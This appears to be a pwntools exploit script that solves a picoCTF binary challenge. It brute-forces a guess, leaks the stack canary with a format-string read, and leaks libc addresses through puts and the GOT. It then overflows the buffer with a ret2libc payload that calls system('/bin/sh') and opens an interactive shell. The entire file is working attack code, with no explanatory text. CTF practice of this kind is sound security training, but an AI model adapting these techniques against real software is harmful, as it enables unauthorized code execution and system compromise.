from pwn import *

binary = context.binary = ELF("./vuln")
libc = ELF("/usr/lib/i386-linux-gnu/libc.so.6")
win = 0

if not args.REMOTE:
    r = process(binary.path)
    puts_offset =libc.sym['puts'] #0x73260
    sys_offset = libc.symbols['system']#0x48150
    binsh_offset = next(libc.search(b'/bin/sh\x00'))#0x1bd0f5
    win = -2527
else:
    r = remote('jupiter.challenges.picoctf.org', 57529)
    puts_offset =0x67560
    sys_offset = 0x3cf10
    binsh_offset = 0x17b9db
    win = -3727
    
# gdb.attach(r, api = True)
canary = 0
win_addr = 0x0804876e

#for i in range(-4096, 4096):
for i in range(-3727,4096):
    r.sendlineafter(b"guess?\n" , str(i))
    response = r.recvline()
    # log.info(f"{i}: {response}")
    if b"win" in response:
        log.info(f"Win key: {i}")
        win = i 
        break

    
r.sendline(b"%135$p")
r.recv()
canary = int(r.recv().split(b": ")[1].split(b"\n")[0],16)
log.info(f"Canary: {hex(canary)}" )
puts_plt = binary.plt['puts']
puts_got = binary.got['puts'] 
printf_got = binary.got['printf'] 
gets_got = binary.got['gets'] 



payload = b"a"*512 + p32(canary) + b"b"*12 
payload += p32(puts_plt) + p32(win_addr) + p32(puts_got)

r.sendline(str(i))
r.sendline(payload)
r.recvuntil(b"a\n\n")
puts_addr = r.recv(4)
log.info(f"Puts leak addr: {hex(u32(puts_addr))}")


payload = b"a"*512 + p32(canary) + b"b"*12 
payload += p32(puts_plt) + p32(win_addr) + p32(printf_got)
r.sendline(payload)
r.recvuntil(b"a\n\n")
printf_got = r.recv(4)
log.info(f"Printf leak addr: {hex(u32(printf_got))}")


payload = b"a"*512 + p32(canary) + b"b"*12 
payload += p32(puts_plt) + p32(win_addr) + p32(gets_got)
r.sendline(payload)
r.recvuntil(b"a\n\n")
gets_got = r.recv(4)
log.info(f"gets leak addr: {hex(u32(gets_got))}")


libc_addr = u32(puts_addr) - puts_offset
sys_addr = libc_addr + sys_offset
binsh_addr = libc_addr + binsh_offset

log.info(f"Libc addr: {hex(libc_addr)}")
payload = b"a"*512 + p32(canary) + b"b"*12 
payload += p32(sys_addr) + p32(win_addr) + p32(binsh_addr)
r.sendline(payload)


r.interactive()
